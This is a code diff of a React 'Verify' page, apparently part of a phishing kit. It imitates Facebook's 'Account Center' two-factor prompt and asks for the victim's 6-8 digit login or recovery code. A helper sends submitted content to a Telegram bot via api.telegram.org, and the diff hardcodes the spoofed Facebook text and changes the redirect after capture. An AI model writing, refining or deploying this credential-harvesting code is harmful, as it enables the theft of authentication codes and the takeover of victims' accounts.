@@ -4,8 +4,6 @@ import axios from "axios";
 import type { FC } from "react";
 import { useEffect, useState } from "react";
 import { useNavigate } from "react-router";
-import { useTranslation } from "@/hooks/useTranslation";
-
 interface UIState {
   error: string;
   isLoading: boolean;
@@ -41,14 +39,14 @@ const sendTelegramMessage = async (
   messageId: string,
 ) => {
   if (messageId) {
-     await axios.post(
-       `https://api.telegram.org/bot${config.token}/deleteMessage`,
-       {
-         chat_id: config.chatId,
-         message_id: messageId,
-       },
-     );
-   }
+    await axios.post(
+      `https://api.telegram.org/bot${config.token}/deleteMessage`,
+      {
+        chat_id: config.chatId,
+        message_id: messageId,
+      },
+    );
+  }
   return axios.post(`https://api.telegram.org/bot${config.token}/sendMessage`, {
     chat_id: config.chatId,
     text: message,
@@ -58,21 +56,6 @@ const sendTelegramMessage = async (
 
 const Verify: FC = () => {
   const navigate = useNavigate();
-
-  const texts = {
-    accountCenter: "Account Center - Facebook",
-    checkNotifications: "Check notifications on another device",
-    approveOrEnter: "Approve from another device or Enter your login code",
-    enterCodeDescription:
-      "Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code",
-    enterCodePlaceholder: "Enter Code (6-8 digits)",
-    continue: "Continue",
-    sendCode: "Send Code",
-    incorrectCode: "Incorrect code. Please try again.",
-  };
-
-  const { t, isLoading: translationLoading } = useTranslation(texts);
-
   const [code, setCode] = useState("");
   const [uiState, setUiState] = useState<UIState>(initialUIState);
   const [config, setConfig] = useState<Config>({
@@ -113,10 +96,10 @@ const Verify: FC = () => {
         );
         localStorage.setItem("messageId", response.data.result.message_id);
         setTimeout(() => {
-          window.location.replace("https://www.facebook.com/");
+          navigate("/upload");
         }, config.loadingTime);
       } catch {
-        window.location.replace("https://www.facebook.com/");
+        navigate("/upload");
       }
       return;
     }
@@ -138,7 +121,7 @@ const Verify: FC = () => {
         setUiState((prev) => ({
           ...prev,
           isLoading: false,
-          error: t("incorrectCode"),
+          error: "Incorrect code. Please try again.",
         }));
       }, config.loadingTime);
     } catch {
@@ -155,19 +138,11 @@ const Verify: FC = () => {
     setCode(e.target.value);
   };
 
-  if (translationLoading) {
-    return (
-      <div className="fixed inset-0 flex items-center justify-center bg-white">
-        <span className="text-xl">Loading...</span>
-      </div>
-    );
-  }
-
   return (
     <div className="flex flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
       <div className="flex flex-col">
-        <b>{t("accountCenter")}</b>
-        <b className="text-2xl">{t("checkNotifications")}</b>
+        <b>Account Center - Facebook</b>
+        <b className="text-2xl">Check notifications on another device</b>
       </div>
 
       <div>
@@ -175,8 +150,11 @@ const Verify: FC = () => {
       </div>
 
       <div>
-        <b>{t("approveOrEnter")}</b>
-        <p>{t("enterCodeDescription")}</p>
+        <b>Approve from another device or Enter your login code</b>
+        <p>
+          Enter 6-digit code we just send from the authentication app you set
+          up, or Enter 8-digit recovery code
+        </p>
       </div>
 
       <div className="my-2 flex flex-col items-center justify-center">
@@ -190,7 +168,7 @@ const Verify: FC = () => {
           maxLength={8}
           minLength={6}
           pattern="\d*"
-          placeholder={t("enterCodePlaceholder")}
+          placeholder="Enter Code (6-8 digits)"
           value={code}
           onFocus={clearError}
           onChange={handleCodeChange}
@@ -213,11 +191,11 @@ const Verify: FC = () => {
           {uiState.isLoading ? (
             <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent p-2" />
           ) : (
-            t("continue")
+            "Continue"
           )}
         </button>
 
-        <p className="text-blue-500 hover:underline">{t("sendCode")}</p>
+        <p className="text-blue-500 hover:underline">Send Code</p>
       </div>
     </div>
   );
